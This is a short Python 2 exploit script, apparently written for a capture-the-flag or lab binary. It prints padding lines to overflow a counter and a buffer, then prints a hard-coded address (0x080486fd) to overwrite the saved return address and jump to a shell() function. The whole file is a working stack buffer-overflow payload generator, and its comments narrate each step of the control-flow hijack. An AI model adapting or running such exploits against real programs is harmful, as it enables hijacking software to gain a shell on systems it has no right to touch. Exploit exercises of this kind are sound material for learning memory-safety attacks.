#! /usr/bin/env python

# 080486fd - shell()
EIP = "\xfd\x86\x04\x08"


SHELL_ARG = "XXXX"

for i in range(9):
    print 'AAAAAA'
    
#overflow the counter on the 10th execution
print 'B' * 20
    
#these are filling up the first_char buffer
for i in range(13):
    print 'CCCCCC'
    
#we've way overflowed now, so overwrite EIP to shell()
for i in EIP:
    print i